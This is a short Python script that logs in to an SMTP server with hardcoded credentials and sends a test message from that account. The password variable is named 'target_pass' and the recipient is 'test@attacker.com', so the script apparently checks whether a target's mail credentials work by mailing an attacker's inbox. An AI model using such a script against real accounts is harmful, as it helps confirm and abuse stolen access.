import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Email configuration
FROM_EMAIL = 'test@example.com'
PASSWORD = 'target_pass'
SERVER = 'mail.smtp.com'
PORT = 587

# Recipient's email
TO_EMAIL = 'test@attacker.com'

# Email content
subject = 'Test Email'
body = 'This is a test email to verify SMTP credentials.'

# Create a multipart message
msg = MIMEMultipart()
msg['From'] = FROM_EMAIL
msg['To'] = TO_EMAIL
msg['Subject'] = subject

# Attach the email body
msg.attach(MIMEText(body, 'plain'))

try:
    # Connect to the server
    server = smtplib.SMTP(SERVER, PORT)
    server.starttls()  # Use TLS

    # Login to the server
    server.login(FROM_EMAIL, PASSWORD)

    # Send the email
    text = msg.as_string()
    server.sendmail(FROM_EMAIL, TO_EMAIL, text)
    print("Email sent successfully!")

    # Disconnect from the server
    server.quit()

except Exception as e:
    print(f"Failed to send email: {e}")
